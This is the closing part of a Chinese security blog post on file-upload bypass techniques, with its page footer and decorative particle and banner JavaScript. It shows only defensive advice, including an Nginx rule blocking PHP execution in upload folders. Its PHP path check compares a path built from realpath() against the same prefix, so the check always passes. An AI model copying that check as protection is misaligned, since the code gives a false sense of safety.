+<h3 id="2-重命名"><a href="#2-重命名" class="headerlink" title="2. 重命名"></a>2. 重命名</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$newName</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure>
+
+<p>避免原始文件名包含路径或恶意后缀。</p>
+<h3 id="3-内容校验"><a href="#3-内容校验" class="headerlink" title="3. 内容校验"></a>3. 内容校验</h3><ul>
+<li>用 <code>getimagesize()</code> 校验图片（不只是 mime 头）</li>
+<li>用 ImageMagick 重渲染图片（去掉附加 payload）</li>
+<li>限制文件大小、宽高</li>
+</ul>
+<h3 id="4-存储隔离"><a href="#4-存储隔离" class="headerlink" title="4. 存储隔离"></a>4. 存储隔离</h3><ul>
+<li>上传目录禁止执行：Nginx <code>location ~* /uploads/.*\.php$ &#123; deny all; &#125;</code></li>
+<li>上传目录单独域名 &#x2F; CDN</li>
+<li>文件存储到对象存储（OSS &#x2F; S3）</li>
+</ul>
+<h3 id="5-路径处理"><a href="#5-路径处理" class="headerlink" title="5. 路径处理"></a>5. 路径处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$savePath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$uploadDir</span>) . DIRECTORY_SEPARATOR . <span class="variable">$newName</span>;</span><br><span class="line"><span class="comment">// 校验 realpath 结果在预期目录内</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$savePath</span>, <span class="title function_ invoke__">realpath</span>(<span class="variable">$uploadDir</span>)) !== <span class="number">0</span>) <span class="keyword">die</span>(<span class="string">&#x27;非法路径&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>文件上传是漏洞高发区。<strong>白名单 + 重命名 + 内容校验 + 禁止执行</strong>是黄金组合。永远不要信任用户传上来的文件名。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>lvyatan
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://lvyatan.github.io/2026/07/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" title="文件上传漏洞绕过技巧整理">https://lvyatan.github.io/2026/07/05/文件上传漏洞绕过技巧/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web-%E5%AE%89%E5%85%A8/" rel="tag"># Web 安全</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
+              <a href="/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" rel="tag"># 绕过技巧</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/06/22/XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%88%A9%E7%94%A8/" rel="prev" title="XSS 漏洞分类与利用笔记">
+                  <i class="fa fa-angle-left"></i> XSS 漏洞分类与利用笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/07/15/Wireshark%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/" rel="next" title="Wireshark 抓包实战笔记">
+                  Wireshark 抓包实战笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-shield"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">11k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<canvas id="particle-canvas"></canvas>
+<script>
+(function () {
+  'use strict';
+
+  // ====================================================================
+  // 1. 粒子动效：Canvas 粒子 + 连线 + 鼠标吸引
+  // ====================================================================
+  function initParticles() {
+    var canvas = document.getElementById('particle-canvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var particles = [];
+    var mouse = { x: -9999, y: -9999, radius: 140 };
+
+    // 配置
+    var COLORS = ['#a78bfa', '#60a5fa', '#34d399', '#f472b6'];
+    var MAX_PARTICLES = window.innerWidth < 768 ? 38 : 70;
+    var LINK_DISTANCE = 130;
+
+    function resize() {
+      canvas.width = window.innerWidth * dpr;
+      canvas.height = window.innerHeight * dpr;
+      canvas.style.width = window.innerWidth + 'px';
+      canvas.style.height = window.innerHeight + 'px';
+      ctx.scale(dpr, dpr);
+    }
+
+    function Particle() {
+      this.x = Math.random() * window.innerWidth;
+      this.y = Math.random() * window.innerHeight;
+      this.vx = (Math.random() - 0.5) * 0.35;
+      this.vy = (Math.random() - 0.5) * 0.35;
+      this.radius = Math.random() * 2 + 1.2;
+      this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+      this.baseAlpha = Math.random() * 0.4 + 0.4;
+    }
+
+    Particle.prototype.update = function () {
+      // 鼠标吸引
+      var dx = mouse.x - this.x;
+      var dy = mouse.y - this.y;
+      var dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < mouse.radius) {
+        var force = (mouse.radius - dist) / mouse.radius;
+        this.vx += (dx / dist) * force * 0.06;
+        this.vy += (dy / dist) * force * 0.06;
+      }
+
+      // 摩擦
+      this.vx *= 0.985;
+      this.vy *= 0.985;
+
+      // 限速
+      var speed = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+      if (speed > 1.5) {
+        this.vx = (this.vx / speed) * 1.5;
+        this.vy = (this.vy / speed) * 1.5;
+      }
+
+      this.x += this.vx;
+      this.y += this.vy;
+
+      // 边界回弹
+      if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+      if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+      this.x = Math.max(0, Math.min(window.innerWidth, this.x));
+      this.y = Math.max(0, Math.min(window.innerHeight, this.y));
+    };
+
+    Particle.prototype.draw = function () {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = this.color;
+      ctx.globalAlpha = this.baseAlpha;
+      ctx.fill();
+
+      // 柔光
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius * 3, 0, Math.PI * 2);
+      var grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius * 3);
+      grad.addColorStop(0, this.color);
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.globalAlpha = 0.12;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    };
+
+    function drawLinks() {
+      for (var i = 0; i < particles.length; i++) {
+        for (var j = i + 1; j < particles.length; j++) {
+          var p1 = particles[i];
+          var p2 = particles[j];
+          var dx = p1.x - p2.x;
+          var dy = p1.y - p2.y;
+          var dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < LINK_DISTANCE) {
+            var alpha = (1 - dist / LINK_DISTANCE) * 0.22;
+            ctx.beginPath();
+            ctx.strokeStyle = p1.color;
+            ctx.globalAlpha = alpha;
+            ctx.lineWidth = 1;
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+            ctx.globalAlpha = 1;
+          }
+        }
+      }
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+      drawLinks();
+      for (var i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function createParticles() {
+      particles = [];
+      for (var i = 0; i < MAX_PARTICLES; i++) particles.push(new Particle());
+    }
+
+    // 初始化
+    resize();
+    createParticles();
+    animate();
+
+    // 鼠标 / 触摸
+    window.addEventListener('mousemove', function (e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', function () {
+      mouse.x = -9999; mouse.y = -9999;
+    });
+    window.addEventListener('touchmove', function (e) {
+      if (e.touches[0]) {
+        mouse.x = e.touches[0].clientX;
+        mouse.y = e.touches[0].clientY;
+      }
+    });
+
+    // resize
+    var resizeTimer;
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(function () {
+        resize();
+        createParticles();
+      }, 200);
+    });
+
+    // 低性能模式：电池或低性能时减粒子
+    if (navigator.getBattery && navigator.getBattery()) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.discharging && battery.level < 0.2) {
+          MAX_PARTICLES = 25;
+          createParticles();
+        }
+      });
+    }
+  }
+
+  // ====================================================================
+  // 2. Hero 区：仅首页注入
+  // ====================================================================
+  function injectHero() {
+    // 通过 page 配置判断是否首页
+    var pageConfigs = document.querySelectorAll('script.next-config[data-name="page"]');
+    var isHome = false;
+    for (var i = 0; i < pageConfigs.length; i++) {
+      try {
+        var cfg = JSON.parse(pageConfigs[i].textContent || '{}');
+        if (cfg.isHome === true) { isHome = true; break; }
+      } catch (e) {}
+    }
+    if (!isHome) return;
+
+    var mainInner = document.querySelector('.main-inner.index.posts-expand');
+    if (!mainInner) return;
+    if (mainInner.querySelector('.hero-section')) return; // 防止重复
+
+    var hero = document.createElement('section');
+    hero.className = 'hero-section';
+    hero.innerHTML = ''
+      + '<div class="hero-content">'
+      + '  <span class="hero-eyebrow">CYBER · SECURITY · NOTES</span>'
+      + '  <h1 class="hero-title">网安学习笔记</h1>'
+      + '  <p class="hero-subtitle">'
+      + '    记录渗透测试、漏洞挖掘、安全工具开发的实践笔记。'
+      + '    <br>每一篇都是亲手敲过的 Payload、跑过的命令、踩过的坑。'
+      + '  </p>'
+      + '  <div class="hero-actions">'
+      + '    <a class="hero-btn hero-btn--primary" href="#main">'
+      + '      <i class="fa fa-book-open"></i> 开始阅读'
+      + '    </a>'
+      + '    <a class="hero-btn hero-btn--ghost" href="/about/">'
+      + '      <i class="fa fa-user"></i> 关于本站'
+      + '    </a>'
+      + '  </div>'
+      + '</div>'
+      + '<div class="hero-scroll-hint">SCROLL</div>';
+
+    mainInner.insertBefore(hero, mainInner.firstChild);
+
+    // 入场动画
+    setTimeout(function () {
+      hero.style.opacity = '0';
+      hero.style.transform = 'translateY(20px)';
+      hero.style.transition = 'opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1)';
+      requestAnimationFrame(function () {
+        hero.style.opacity = '1';
+        hero.style.transform = 'translateY(0)';
+      });
+    }, 50);
+  }
+
+  // ====================================================================
+  // 3. 卡片入场动画（首页文章）
+  // ====================================================================
+  function animateCards() {
+    var cards = document.querySelectorAll('.index.posts-expand .post-block');
+    if (!cards.length) return;
+    if (!('IntersectionObserver' in window)) return;
+
+    cards.forEach(function (card, idx) {
+      card.style.opacity = '0';
+      card.style.transform = 'translateY(24px)';
+      card.style.transition = 'opacity 0.6s ease ' + (idx * 0.08) + 's, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) ' + (idx * 0.08) + 's';
+    });
+
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    cards.forEach(function (card) { io.observe(card); });
+  }
+
+  // ====================================================================
+  // 4. 启动
+  // ====================================================================
+  function boot() {
+    try { initParticles(); } catch (e) { console.warn('particles failed:', e); }
+    try { injectHero(); } catch (e) { console.warn('hero inject failed:', e); }
+    try { animateCards(); } catch (e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+  // PJAX 兼容（NexT 用 pjax 切页）
+  window.addEventListener('pjax:success', boot);
+})();
+</script>
+
+</body>
+</html>
